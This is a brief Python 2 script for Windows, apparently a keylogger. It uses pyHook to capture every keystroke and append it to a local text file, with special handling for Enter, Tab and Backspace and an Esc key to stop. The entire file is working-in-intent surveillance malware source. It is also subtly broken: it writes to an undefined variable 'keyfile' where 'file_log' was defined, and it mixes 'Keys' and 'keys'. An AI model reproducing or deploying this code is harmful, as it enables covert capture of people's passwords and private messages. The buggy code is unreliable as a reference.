import pyHook, pythoncom, sys, logging
#install python 2.7 ,next pyhook and pywin32
file_log = 'C:\\keylogger\\output.txt'
data=''
def onKeyBoardEvent(event):
    global data
    if event.Ascii==13:
        keys='|-->\n'
        fp=open(keyfile,'a')
        data=keys
        fp.write(data)
        fp.close()
    elif event.Ascii==8:
        Keys=' '
        fp=open(keyfile,'a')
        data=keys
        fp.write(data)
        fp.close()
    elif event.Ascii==9:
        keys='TAB'
        fp=open(keyfile,'a')
        data=keys
        fp.write(data)
        fp.close()
    elif event.Ascii==27:
        raise SystemExit # Stop the script if you press esc
    else:
        keys=chr(event.Ascii)
        fp=open(keyfile,'a')
        data=keys
        fp.write(data)
        fp.close()


hook_Manager=pyHook.HookManager()
hook_Manager.KeyDown=onKeyBoardEvent
hook_Manager.HookKeyboard()
pythoncom.PumpMessages()


